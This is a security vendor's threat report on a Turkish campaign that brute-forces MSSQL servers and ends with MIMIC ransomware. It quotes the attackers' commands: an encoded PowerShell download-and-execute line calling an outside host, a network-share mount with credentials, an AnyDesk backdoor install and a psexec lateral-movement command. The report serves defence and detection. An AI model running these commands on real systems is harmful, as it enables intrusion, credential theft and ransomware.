										<div class="">
											<div class="text-block bullets-listing">
											<p>By Securonix Threat Research: D. Iuzvyk, T. Peck, O. Kolesnikov</p>
<p>tldr: Financially motivated Turkish threat actors appear to be actively targeting MSSQL servers in an effort to deliver MIMIC ransomware payloads .</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2024/01/659c09d63a25b.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-23717 size-large" src="https://www.securonix.com/wp-content/uploads/2024/01/659c09d63a25b-1024x574.png" alt="" width="640" height="359" /></a></p>
<p>The Securonix Threat Research team has been monitoring an ongoing threat campaign, RE#TURGENCE which involves the targeting and exploitation of MSSQL database servers to gain initial access. The threat actors appear to be targeting US, EU and LATAM countries and are financially motivated.</p>
<p>The analyzed threat campaign appears to end in one of two ways, either the selling of “access” to the compromised host, or the ultimate delivery of ransomware payloads. These details were uncovered during a major OPSEC (operational security) failure by the attackers which we’ll dive into later. The timeline for the events was about one month from initial access to the deployment of MIMIC ransomware on the victim domain.</p>
<p>The initial access portion of the campaign is similar to that of <a href="https://www.securonix.com/blog/securonix-threat-labs-security-advisory-threat-actors-target-mssql-servers-in-dbjammer-to-deliver-freeworld-ransomware/">DB#JAMMER</a> which we wrote about  last year which also involved direct MSSQL access through brute forcing administrative passwords.</p>
<h2>Initial Access (TA0001)</h2>
<p>Threat actors have been targeting exposed database servers heavily over the last year. In addition to DB#JAMMER, other campaigns targeting these servers have been reported recently, some including <a href="https://www.bleepingcomputer.com/news/security/mysql-servers-targeted-by-ddostf-ddos-as-a-service-botnet/">obtaining access through botnets</a>.</p>
<p>In the case of RE#TURGENCE, the threat actors were able to brute force their way into the victim server and leveraged the use of the <a href="https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql?view=sql-server-ver16">xp_cmdshell</a> procedure to execute commands on the host. Typically, this procedure is disabled by default and should not be enabled (especially on publicly exposed servers).</p>
<h2>Execution (TA0002)</h2>
<p>Once the attackers were able to execute code through the xp_cmdshell procedure, they executed the following command on the server from the sqlservr.exe process:</p>
<p><span style="color: #c00000;">&#8220;C:\Windows\system32\cmd.exe&#8221; /c cmd /c powershell -exec bypass -w 1 -e aQBlAHgAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAYwBsAGkAZQBuAHQAKQAuAEQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwA4ADgALgAyADEANAAuADIANgAuADMAOgAyADUAOAAyADMALwAxADgAOQBKAHQAJwApACkA</span></p>
<p>The command calls cmd.exe were sent twice to execute a PowerShell encoded command which when decoded contains the following command:</p>
<p><span style="color: #c00000;">iex((New-Object System.Net.Webclient).DownloadString(&#8216;hxxp://88.214.26[.]3:25823/189Jt&#8217;))</span></p>
<p>The above command downloads a file (189Jt) from the remote server and executes its contained code via a PowerShell invoke expression. Essentially, any contained PowerShell code within the file will be downloaded and immediately executed.</p>
<p>The PowerShell script is semi-obfuscated while most of the code appears to be ignored. It appears to download and run the next stage found at the end of the first script. As seen in the figure below:</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2024/01/659c09bf2b214.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-23705 size-large" src="https://www.securonix.com/wp-content/uploads/2024/01/659c09bf2b214-1024x605.png" alt="" width="640" height="378" /></a></p>
<p>Figure 1: PowerShell initial code execution (phase 1)</p>
<h3>Cobalt Strike implementation</h3>
<p>The next PowerShell script found at <span style="color: #c00000;">hxxp://88.214.26[.]3:25823/MSjku</span> is downloaded and executed in the same manner. This script contained a heavily obfuscated Cobalt Strike payload which is loaded into the current running process using in-memory reflection techniques (PowerShell in this case). The script is heavily obfuscated, however our team was able to save and extract the Cobalt Strike configuration which is found in Appendix A at the end of the report.</p>
<p>The main focus of the obfuscation was centered around the DLL imports and the Cobalt Strike payload which consisted of hundreds of lines of combined variables and useless comment blocks.</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2024/01/659c09e0a3866.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-23721 size-large" src="https://www.securonix.com/wp-content/uploads/2024/01/659c09e0a3866-1024x605.png" alt="" width="640" height="378" /></a></p>
<p>Figure 2: PowerShell initial code execution (phase 2: Cobalt Strike)</p>
<p>According to the configuration, the Cobalt Strike beacon is configured to inject into the Windows-native process SndVol.exe. This process handles volume controls and settings for the system.</p>
<h3>AnyDesk implementation</h3>
<p>Using Cobalt Strike as a main point of code execution, the attackers decided to go for a more hands-on approach. The AnyDesk binaries were downloaded from a mounted network share that the attackers set up and accessed using the following command:</p>
<p><span style="color: #c00000;">&#8220;c:\windows\system32\cmd.exe&#8221; /c net use f: /delete /y &amp; net use f: \\45.148.121[.]87\f /user:grogu aqu!8171881cerq</span></p>
<p>Once mounted as the “F:\” drive, the attackers copied the AnyDesk installer to C:\ad.exe, along with the file ad.bat. The purpose of ad.bat is to simply install the AnyDesk connector service, add a new local user and add that user to the administrators group. The contents of the bat file can be seen in the figure below:</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2024/01/659c09f141594.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-23725 size-large" src="https://www.securonix.com/wp-content/uploads/2024/01/659c09f141594-1024x605.png" alt="" width="640" height="378" /></a></p>
<p>Figure 3: File contents of ad.bat</p>
<h2>Persistence (TA0003)</h2>
<p>You’ll notice in the ad.bat file that the local user “windows” is created with the password “denek1010”. The user is added to the “administrators” (EN) and if present, “administradores” (LATAM) groups. This leads us to believe that these threat actors built this script with a wide target range in mind.</p>
<p>Additionally, the script installs the AnyDesk service using the command “<span style="color: #c00000;">c:\ad.exe  &#8211;install c:\&#8221;program files (x86)&#8221;\ &#8211;silent</span>”, stops and starts the service, and then prints the AnyConnect client ID.</p>
<p>At this point, the threat actors shifted to exclusively using AnyConnect in favor of Cobalt Strike.</p>
<h2>Credential Access (TA0006)</h2>
<p>We observed the threat actors download Mimikatz into the “c:\users\windows\desktop\x64\” directory using AnyDesk. Another batch script was also downloaded to automate some of the Mimikatz commands. Its contents can be seen in the figure below:</p>
<p><a href="https://www.securonix.com/wp-content/uploads/2024/01/659c09c67d9bd.png" target="_blank" rel="noopener"><img loading="lazy" decoding="async" class="aligncenter wp-image-23709 size-large" src="https://www.securonix.com/wp-content/uploads/2024/01/659c09c67d9bd-1024x605.png" alt="" width="640" height="378" /></a></p>
<p>Figure 4: File contents of start.bat</p>
<p>The script performs several functions. First it uses a known registry tweak to enable clear text credentials. It then does a quick “is Base64” check by looking for the presence of the “C:\Program Files (x86)” directory and executes Mimikatz from the corresponding subdirectory (x86 or x64). The results of the Mimikatz dump are then saved into the Mimikatz_dump.txt file.</p>
<h2>Discovery (TA0102)</h2>
<p>The threat actors then shifted gears and decided to get to know the network and domain a bit better. The Advanced Port Scanner utility was downloaded via AnyDesk and saved as<span style="color: #c00000;"> c:\users\windows\documents\advport.exe</span>.</p>
<p>Our team observed the following activities from the Advanced Port Scanner utility:</p>
<ul>
<li>Check domain controller remote shares (from UI of Advanced Port Scanner)</li>
<li>Get the hostname of a Hyper-V VM host using reg query &#8220;<span style="color: #c00000;">HKLM\Software\Microsoft\Virtual Machine\guest\parameters</span>&#8220;</li>
<li>Test psexec.exe connection to DC (result fail)</li>
<li>Run psexec.exe on DC using extracted DA passwords(Mimikatz on MSSQL)</li>
<li>Test for the usage of RDP connecting  to DC using dumped creds from Advanced Port Scanner UI (<span style="color: #c00000;">mstsc  /v: [IP_REDACTED]</span>)</li>
<li>Check for remote shares on jumphosts (from UI of Advanced Port Scanner)</li>
<li>Test for and use RDP connecting to decoy host from Advanced Port Scanner UI (<span style="color: #c00000;">mstsc  /v: [IP_REDACTED]</span>)</li>
</ul>
<h2>Lateral Movement (TA0008)</h2>
<p>Eventually after a few days, the threat actors were able to move laterally into two other machines on the network, likely using data provided by Mimikatz and the Advanced Port Scanner utility.</p>
<p>The threat actors transferred in <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/psexec">psexec</a>, a Sysinternals utility commonly used by threat actors and red teamers. They used the utility to open a new session to a domain controller with a domain admin password which was obtained earlier. The following command was issued on the compromised MSSQL server to move laterally:</p>
<p><span style="color: #c00000;">c:\psexec.exe  -u [REDACTED_DOMAIN]\[REDACTED_USER] -p [REDACTED_PASS] \\[REDACTED_IP] cmd.exe</span></p>
<p>Using the domain admin account, the threat actors were able to move to other machines from within the domain.</p>
<h2>Impact (TA0105)</h2>
<p>At this point, after a few more attempts at lateral movement using psexec, the threat actors appeared to have had enough and decided to ransomware the host.</p>
<p>The ransomware payload was downloaded using AnyDesk and was downloaded into c:\Users\windows\Documents\ as red25.exe. This payload is a self-extracting archive that extracts and runs red.exe which is the final ransomware payload.</p>
<p>The ransomware of choice is Mimic ransomware which uses the legitimate application <a href="https://www.voidtools.com/">Everything by VoidTools</a> to query and locate target files to be encrypted. Mimic was first <a href="https://www.trendmicro.com/en_ph/research/23/a/new-mimic-ransomware-abuses-everything-apis-for-its-encryption-p.html">identified and gained traction</a> in January 2023. Mimic will drop the Everything binaries used to aid the encryption process. The Mimic dropper in our case “red25.exe” dropped all of the necessary files in order for the main ransomware payload to complete its objectives. These files include:</p>
<ul>
<li>c:\users\windows\appdata\local\temp\7zipsfx.000\global_options.ini</li>
<li>c:\users\windows\appdata\local\temp\7zipsfx.000\everything2.ini</li>
<li>c:\users\windows\appdata\local\temp\7zipsfx.000\everything.ini</li>
<li>c:\users\windows\appdata\local\temp\7zipsfx.000\everything64.dll</li>
<li>c:\users\windows\appdata\local\temp\7zipsfx.000\everything32.dll</li>
<li>c:\users\windows\appdata\local\temp\7zipsfx.000\everything.exe</li>
<li>c:\users\windows\appdata\local\temp\7zipsfx.000\7za.exe</li>
</ul>

<h2>Securonix recommendations and mitigations</h2>
<p>Always refrain from exposing critical servers directly to the internet. In the case of RE#TURGENCE attackers were directly able to brute force their way into the server from outside the main network. We recommend providing access to these resources behind a much more secure infrastructure such as a VPN. Additionally:</p>
<ul>
<li>Limit the usage of the xp_cmdshell procedure on MSSQL database servers. This would have prevented the attackers from executing commands on the victim’s machine.</li>
<li>When it comes to detecting both RMM and/or RAT-like software, we highly recommend <a href="https://www.securonix.com/blog/improving-blue-team-threat-detection-with-enhanced-siem-telemetry/">enabling process-level logging</a> on endpoints and servers for enhanced telemetry for both detections and threat hunting</li>
<li>Deploy additional process-level logging such as <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> and <a href="https://www.crowdstrike.com/blog/investigating-powershell-command-and-script-logging/">PowerShell logging</a> for additional log detection coverage</li>
<li>Monitor for the creation of new local users on endpoints, especially within critical server environments</li>
<li>Securonix customers can rely on some of the provided provisional detections or scan their environment using the threat hunting queries below</li>
</ul>
